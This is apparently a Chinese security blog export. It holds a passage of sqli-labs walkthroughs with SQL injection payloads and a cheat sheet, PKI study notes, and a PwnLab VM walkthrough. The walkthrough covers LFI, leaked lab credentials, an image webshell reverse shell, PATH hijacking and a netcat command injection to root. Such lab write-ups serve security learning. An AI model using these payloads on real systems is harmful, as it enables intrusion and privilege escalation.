<p><code>id=-1&#39;) union select 1,database(),3 --+</code></p>
<h1 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h1><p>感觉是重复的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">又是一个post的报错注入啊</span><br></pre></td></tr></table></figure>

<p><code>login_user=asd&amp;login_password=-1&#39; union select 1,extractvalue(1,(concat(1,database(),0x5c))),3 --+&amp;mysubmit=Login</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907205356414.png" alt="image-20220907205356414"></p>
<h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$username</span>&#x27;) and password=(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>和上面一样，只不过多了个括号</p>
<p><code>login_user=asd&amp;login_password=-1&#39;) union select 1,extractvalue(1,(concat(1,database(),0x5c))),3 --+&amp;mysubmit=Login</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210018082.png" alt="image-20220907210018082"></p>
<h1 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h1><p>不报错了啊</p>
<p><code>login_user=asd&amp;login_password=-1&#39;or 1=1 --+&amp;mysubmit=Login</code></p>
<p>万能密码可以进去，但是想报数据库的话用时间盲注吧。</p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210359235.png" alt="image-20220907210359235"></p>
<h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210818029.png" alt="image-20220907210818029"></p>
<p>和上面一样，加了个括号罢了</p>
<h1 id="less46-order-by-报错注入"><a href="#less46-order-by-报错注入" class="headerlink" title="less46-order by 报错注入"></a>less46-order by 报错注入</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];	</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>sort=1 and extractvalue(1,concat(0x5c,database(),0x5c)) --+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908102836598.png" alt="image-20220908102836598"></p>
<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>闭合一下单引号，然后报错注入</p>
<p><code>sort=1&#39; and extractvalue(1,concat(0x5c,database())) --+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103120248.png" alt="image-20220908103120248"></p>
<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>和46关一样，只是不报错了，我们使用时间盲注。</p>
<p><code>sort=1%20and%20if(substr((select%20database()),1,1)=%27s%27,sleep(5),1)%20--+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103750327.png" alt="image-20220908103750327"></p>
<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p><code>sort=1%27%20and%20if(substr((select%20database()),1,1)=%27s%27,sleep(5),1)%20--+</code></p>
<p>闭合单引号的时间盲注</p>
<h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p><code>sort=1 and extractvalue(1,concat(0x5c,database())) --+</code></p>
<p>报错注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<h1 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort=1&#x27; and extractvalue(1,concat(0x5c,database())) --+</span><br></pre></td></tr></table></figure>

<p>闭合单引号的报错注入</p>
<h1 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h1><p>时间盲注</p>
<p><code>1%20and%20if(substr((select%20database()),1,1)=%27s%27,sleep(5),1)%20--+</code></p>
<p>这不几关重复了吗</p>
<h1 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h1><p>笑死我了，代码没看，盲猜闭合单引号的时间盲注</p>
<p><code>1%20and%20if(substr((select%20database()),1,1)=%27s%27,sleep(5),1)%20--+</code></p>
<h1 id="less54"><a href="#less54" class="headerlink" title="less54"></a>less54</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>id=-1&#39; union select 1,database(),2 --+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908111630245.png" alt="image-20220908111630245"></p>
<h1 id="less55"><a href="#less55" class="headerlink" title="less55"></a>less55</h1><p>闭合括号的联合注入</p>
<p><code>id=-1) union select 1,database(),2 --+</code></p>
<h1 id="less56"><a href="#less56" class="headerlink" title="less56"></a>less56</h1><p>闭合单引号括号的联合注入</p>
<p><code>id=-1&#39;) union select 1,database(),2 --+</code></p>
<h1 id="less57"><a href="#less57" class="headerlink" title="less57"></a>less57</h1><p>闭合双引号的联合注入</p>
<p><code>id=-1&quot; union select 1,database(),2 --+</code></p>
<h1 id="less58"><a href="#less58" class="headerlink" title="less58"></a>less58</h1><p>闭合单引号的报错注入</p>
<p><code>id=-1&#39; and extractvalue(1,concat(0x5c,database())) --+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908112508666.png" alt="image-20220908112508666"></p>
<h1 id="less59"><a href="#less59" class="headerlink" title="less59"></a>less59</h1><p><code>?id=-1 and extractvalue(1,concat(0x5c,database())) --+</code></p>
<p>不用闭合的报错注入</p>
<h1 id="less60"><a href="#less60" class="headerlink" title="less60"></a>less60</h1><p>闭合双引号括号的报错注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;(&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>id=-1&quot;) and extractvalue(1,concat(0x5c,database())) --+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908113600319.png" alt="image-20220908113600319"></p>
<h1 id="less61"><a href="#less61" class="headerlink" title="less61"></a>less61</h1><p>闭合单引号双括号的报错注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>id=-1&#39;)) and extractvalue(1,concat(0x5c,database())) --+</code></p>
<h1 id="less62"><a href="#less62" class="headerlink" title="less62"></a>less62</h1><p>不报错的，闭合单引号括号的时间盲注</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>id=1&#39;) and if(substr((select database()),1,1)=&#39;c&#39;,sleep(3),1) --+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114412114.png" alt="image-20220908114412114"></p>
<h1 id="less63"><a href="#less63" class="headerlink" title="less63"></a>less63</h1><p>不报错的，闭合单引号的时间盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and if(substr((select database()),1,1)=&#x27;c&#x27;,sleep(3),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114513361.png" alt="image-20220908114513361"></p>
<h1 id="less64"><a href="#less64" class="headerlink" title="less64"></a>less64</h1><p>不报错的，闭合双括号的时间盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1)) and if(substr((select database()),1,1)=&#x27;c&#x27;,sleep(3),1) --+</span><br></pre></td></tr></table></figure>

<h1 id="less65"><a href="#less65" class="headerlink" title="less65"></a>less65</h1><p>不报错的，闭合双引号括号的时间盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&quot;) and if(substr((select database()),1,1)=&#x27;c&#x27;,sleep(13),1) --+</span><br></pre></td></tr></table></figure>

<h1 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h1><p>这里总结一下使用的sql注入吧，也算是从代码层面复习了一遍基础的sql注入了，基础搞扎实，以后才不难。</p>
<h2 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php常用函数总结：</span><br><span class="line">substr(string,start,length) 函数返回字符串的一部分，第一个参数从哪开始，length是长度</span><br><span class="line"></span><br><span class="line">get_magic_quotes_gpc()  当magic_quotes_gpc=On（自动转义特殊字符）魔术引号开的时候，就会返回1</span><br><span class="line"></span><br><span class="line">mysqli_real_escape_string()  函数转义在 SQL 语句中使用的字符串中的特殊字符</span><br><span class="line"></span><br><span class="line">stripslashes()   函数返回一个去除转义反斜线后的字符串</span><br><span class="line"></span><br><span class="line">concat()  函数用于将两个字符串连接起来，形成一个单一的字符串</span><br><span class="line"></span><br><span class="line">setcookie(name,value,expire,path,domain,secure)</span><br><span class="line"></span><br><span class="line">explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</span><br><span class="line"></span><br><span class="line">preg_last_error 函数用于转义正则表达式字符。</span><br><span class="line"></span><br><span class="line">preg_replace($pattern,$replacement,$subject)搜索 subject 中匹配 pattern 的部分，以replacement进行替换</span><br></pre></td></tr></table></figure>

<h2 id="sql语法"><a href="#sql语法" class="headerlink" title="sql语法"></a>sql语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用sql语句总结</span><br><span class="line">order by 1</span><br><span class="line">select 1,database(),2</span><br><span class="line">if(1,2,3) //1要是对的就执行2，反之则3.</span><br><span class="line">substr（1,2,3） //1字符串，从2开始，截取长度3</span><br><span class="line">sleep(5)  //睡5秒</span><br><span class="line"></span><br><span class="line">extractvalue(XML_document,XPath_string)  //从XML_document中提取符合XPATH_string的值，当我们XPath_string语法报错时候就会报错，下面的语法就是错误的</span><br><span class="line"></span><br><span class="line">UPDATEXML (XML_document, XPath_string, new_value)  //改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</span><br><span class="line">当我们XPath_string语法报错时候就会报错</span><br><span class="line"></span><br><span class="line">group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#x27;分隔符&#x27;])</span><br></pre></td></tr></table></figure>

<h2 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用的注入语句</span><br><span class="line">id=1&quot;) and 1=2 union select 1,database(),user() --+ //union注入</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if(1=1,sleep(5),1)--+   //测试一下时间注入</span><br><span class="line"></span><br><span class="line">id=1%27%20and%20if(substr((select%20database()),1,1)=%27s%27,sleep(5),1)%20--+ //时间盲注</span><br><span class="line"></span><br><span class="line">id=5&#x27; and substr((select database()),1,1)=&#x27;r&#x27; --+  //布尔盲注</span><br><span class="line"></span><br><span class="line">uname=-1&amp;passwd=-1&quot; or 1=1 --+&amp;submit=Submit //万能密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x5c,database(),0x5c)))  //   extractvalue爆数据库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))  //updatexml爆数据库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 &#x27;  //union联合注入</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-daima</category>
      </categories>
  </entry>
  <entry>
    <title>PKI（数字证书系统）</title>
    <url>/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/</url>
    <content><![CDATA[<h1 id="PKI（数字证书系统）"><a href="#PKI（数字证书系统）" class="headerlink" title="PKI（数字证书系统）"></a>PKI（数字证书系统）</h1><p>bilibili找了个课程，记录一下学习过程</p>
<h1 id="散列函数"><a href="#散列函数" class="headerlink" title="散列函数"></a>散列函数</h1><p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231013201415718.png" alt="image-20231013201415718"></p>
<p><strong>散列函数的特点</strong>：固定大小，雪崩效应，单向，冲突避免</p>
<h1 id="密钥算法"><a href="#密钥算法" class="headerlink" title="密钥算法"></a>密钥算法</h1><p>简单记录一下，</p>
<h2 id="对称密钥算法"><a href="#对称密钥算法" class="headerlink" title="对称密钥算法"></a>对称密钥算法</h2><p>使用相同的密钥的算法进行加密和解密，优点:非常快，安全，紧凑。</p>
<h2 id="非对称密钥算法"><a href="#非对称密钥算法" class="headerlink" title="非对称密钥算法"></a>非对称密钥算法</h2><p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015184112596.png" alt="image-20231015184112596"></p>
<p>缺点：加密速度非常慢，密文会非常长。</p>
<p>一般来说，都是对称加密和非对称机密同时使用，</p>
<p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015190332650.png" alt="image-20231015190332650"></p>
<p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015190338867.png" alt="image-20231015190338867"></p>
<h1 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h1><p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015190853472.png" alt="image-20231015190853472"></p>
<p>证书加密是私钥，解密（校验）是公钥。<br>因为只有发送方存在私钥，所以证书具有不可否认性。<br>任何人都有公钥，来校验这个文件是否完整和是否源自发送方。</p>
<h1 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h1><p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015191809857.png" alt="image-20231015191809857"></p>
<p>证书系统的目的就是给两端提供一次安全的公钥加密</p>
<p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015193250043.png" alt="image-20231015193250043"></p>
<p><strong>受信任的介绍</strong>，通过中间人b，使a和c建立受信任的联系。</p>
<h1 id="证书授权颁发机构CA"><a href="#证书授权颁发机构CA" class="headerlink" title="证书授权颁发机构CA"></a>证书授权颁发机构CA</h1><p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015193426511.png" alt="image-20231015193426511"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.PKI  最高级的（类似zf，为了颁布证书所弄出来的所有东西）</span><br><span class="line">2.CA  中间的（类似发证的机构，公安局之类的）</span><br><span class="line">3.证书  （类似身份证）</span><br></pre></td></tr></table></figure>

<p><strong>步骤：</strong></p>
<p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015193656625.png" alt="image-20231015193656625"></p>
<p>1.首先客户需要得到ca的根证书，然后将客户自己的公钥提供给ca。</p>
<p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015193747827.png" alt="image-20231015193747827"></p>
<p>2.证书服务器会把客户的个人信息和公钥，哈希加密之后得到的东西就叫签名。随后，将明文的个人信息，明文的公钥，明文的hash（通过CA的私钥做的），<strong>这个东西的集合就叫数字证书（下图）</strong>。</p>
<p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231015194232854.png" alt="image-20231015194232854"></p>
<p>3.客户收到CA发送的消息之后，就可以通过CA的公钥对hash值进行校验，确定是CA发布的。这个时候就可以通过消息中的公钥得到对面客户的公钥。</p>
<h1 id="证书申请的步骤"><a href="#证书申请的步骤" class="headerlink" title="证书申请的步骤"></a>证书申请的步骤</h1><h2 id="同步时间"><a href="#同步时间" class="headerlink" title="同步时间"></a>同步时间</h2><p>时间是整个PKI系统的重中之重，必须要先确保参加PKI系统的设备和主机的时间同步，才能开始PKI的部署。</p>
<h2 id="部署证书服务器"><a href="#部署证书服务器" class="headerlink" title="部署证书服务器"></a>部署证书服务器</h2><p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231016182824907.png" alt="image-20231016182824907"></p>
<h2 id="客户端产生密钥"><a href="#客户端产生密钥" class="headerlink" title="客户端产生密钥"></a>客户端产生密钥</h2><p>每一个实体在申请证书之前，需要预先产生RSA密钥对。</p>
<h2 id="验证证书服务器"><a href="#验证证书服务器" class="headerlink" title="验证证书服务器"></a>验证证书服务器</h2><p>每一个实体需要获取证书服务器的根证书，里面包含证书服务器的公钥。获取了根证书后，乐意通过fingerprint离线验证证书服务器。</p>
<h2 id="申请个人证书"><a href="#申请个人证书" class="headerlink" title="申请个人证书"></a>申请个人证书</h2><h2 id="审核并签名证书"><a href="#审核并签名证书" class="headerlink" title="审核并签名证书"></a>审核并签名证书</h2><h2 id="颁发数字证书"><a href="#颁发数字证书" class="headerlink" title="颁发数字证书"></a>颁发数字证书</h2><h2 id="交换公钥"><a href="#交换公钥" class="headerlink" title="交换公钥"></a>交换公钥</h2><h1 id="证书的申请与吊销"><a href="#证书的申请与吊销" class="headerlink" title="证书的申请与吊销"></a>证书的申请与吊销</h1><p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231016183313907.png" alt="image-20231016183313907"></p>
<p>三个经典的申请方式。</p>
<h2 id="申请"><a href="#申请" class="headerlink" title="申请"></a>申请</h2><p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231016183335825.png" alt="image-20231016183335825"></p>
<h2 id="吊销"><a href="#吊销" class="headerlink" title="吊销"></a>吊销</h2><p><img src="/2023/10/16/PKI%EF%BC%88%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%EF%BC%89/image-20231016184107006.png" alt="image-20231016184107006"></p>
]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>PwnLab</title>
    <url>/2022/11/02/PwnLab/</url>
    <content><![CDATA[<h1 id="PwnLab"><a href="#PwnLab" class="headerlink" title="PwnLab"></a>PwnLab</h1><p>今天最后一个靶场，ヾ(◍°∇°◍)ﾉﾞ</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先是拿到对面主机的ip地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/PwnLab/image-20221102154203603.png" alt="image-20221102154203603"></p>
<p><code>192.168.100.169</code></p>
<p>扫端口</p>
<p><code>nmap -A 192.168.100.169</code></p>
<p><img src="/2022/11/02/PwnLab/image-20221102154334254.png" alt="image-20221102154334254"></p>
<p>80,111,3306,</p>
<p>扫目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.100.169/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/PwnLab/image-20221102154515475.png" alt="image-20221102154515475"></p>
<p>扫指纹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whatweb http://192.168.100.169/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/PwnLab/image-20221102154533302.png" alt="image-20221102154533302"></p>
<h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><p>没有cms，没有注释，扫目录没扫到，没有注入（至少我没有测试出来）。</p>
<p>那就只有把目光投向唯一的url了，随便加了个单引号发现图片挂了，sql测试了无报错，随后想到了是文件包含漏洞。</p>
<p>百度了一个payload<code>http://192.168.100.169/?page=php://filter/read=convert.base64-encode/resource=index</code>利用伪协议读取文件</p>
<p>最后通过阅读index追溯到-login-config</p>
<p><img src="/2022/11/02/PwnLab/image-20221102155803535.png" alt="image-20221102155803535"></p>
<p><img src="/2022/11/02/PwnLab/image-20221102155757889.png" alt="image-20221102155757889"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root</span><br><span class="line">H4u%QJ_H99</span><br><span class="line">Users</span><br></pre></td></tr></table></figure>

<p>不得不怀疑是mysql的那个东西</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>这里我们尝试使用伪协议写入一句话木马</p>
<p>失败</p>
<p><img src="/2022/11/02/PwnLab/image-20221102160903531.png" alt="image-20221102160903531"></p>
<p>那还是直接上mysql看看吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -h 192.168.100.169</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/PwnLab/image-20221102161318474.png" alt="image-20221102161318474"></p>
<p><img src="/2022/11/02/PwnLab/image-20221102161257509.png" alt="image-20221102161257509"></p>
<p><img src="/2022/11/02/PwnLab/image-20221102161332481.png" alt="image-20221102161332481"></p>
<p>解密一下这些账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kent JWzXuBJJNy</span><br><span class="line">mike SIfdsTEn6I</span><br><span class="line">kane iSv5Ym2GRo</span><br></pre></td></tr></table></figure>

<p>用这些账号登录一下试一下</p>
<p><img src="/2022/11/02/PwnLab/image-20221102162916435.png" alt="image-20221102162916435"></p>
<p>可以上传文件，并且只能传图片，没有解析漏洞，%00,00截断无用。肚子里没水了，只有求助攻略。</p>
<p>攻略中查看index的源码发现有这么一行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;lang/&quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lang&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果cookie中设置了lang，就将其包含进来，那我们就包含我们的图片马就可以了，图片马设置一个执行反弹shell的命令。</p>
<p><img src="/2022/11/02/PwnLab/image-20221102175447928.png" alt="image-20221102175447928"></p>
<p>然后在cookie中设置lang字段来进行文件包含操作</p>
<p><img src="/2022/11/02/PwnLab/image-20221102175506147.png" alt="image-20221102175506147"></p>
<p><img src="/2022/11/02/PwnLab/image-20221102175513963.png" alt="image-20221102175513963"></p>
<p>成功获取反弹shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>话说不是有个root的mysql吗，尝试udf提权。</p>
<p>未果</p>
<p><a href="https://wanheiqiyihu.top/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/"># 利用Escalate_Linux靶机学习11种linux提权 | 十三の博客 (wanheiqiyihu.top)</a></p>
<p>首先通过<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>建立一个tty</p>
<p>利用我以前这片文章的思路，进行提权操作。</p>
<p><img src="/2022/11/02/PwnLab/image-20221102180708682.png" alt="image-20221102180708682"></p>
<p><img src="/2022/11/02/PwnLab/image-20221102180621728.png" alt="image-20221102180621728"></p>
<p>然后尝试登录上面的账户</p>
<p><img src="/2022/11/02/PwnLab/image-20221102180652404.png" alt="image-20221102180652404"></p>
<p><img src="/2022/11/02/PwnLab/image-20221102180902366.png" alt="image-20221102180902366"></p>
<p>当进入kane账户的时候，通过<code>find / -perm -u=s -type f 2&gt;/dev/null</code>发现具有suid的文件中有这么个东西</p>
<p><img src="/2022/11/02/PwnLab/image-20221102180950669.png" alt="image-20221102180950669"></p>
<p>执行发现是执行的cat命令</p>
<p><img src="/2022/11/02/PwnLab/image-20221102181046024.png" alt="image-20221102181046024"></p>
<p>通过环境变量劫持来进行一个提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/kane</span><br><span class="line">ls</span><br><span class="line">./msgmike</span><br><span class="line">echo $PATH</span><br><span class="line">cd ../../../../../../</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; tmp/cat</span><br><span class="line">export PATH=/tmp:$PATH </span><br><span class="line">echo $PATH  </span><br><span class="line">chmod 755 /tmp/cat</span><br><span class="line">cd /hone/kane</span><br><span class="line">./msgmike</span><br></pre></td></tr></table></figure>

<p>执行之后发现用户已经变成了mike</p>
<p><img src="/2022/11/02/PwnLab/image-20221102181634138.png" alt="image-20221102181634138"></p>
<p>又用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>发现这么个东西</p>
<p><img src="/2022/11/02/PwnLab/image-20221102181705674.png" alt="image-20221102181705674"></p>
<p><img src="/2022/11/02/PwnLab/image-20221102181940676.png" alt="image-20221102181940676"></p>
<p>执行之后发现是给root用户发信息的一个东西</p>
<p>最后还是看了下攻略，都没解释原理，不过原理也很好推测，就是一个命令执行，加了一个分号之后多加了一条命令，直接弹一个root权限的账户回来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;nc -c sh 192.168.100.129 6667</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/PwnLab/image-20221102182427360.png" alt="image-20221102182427360"></p>
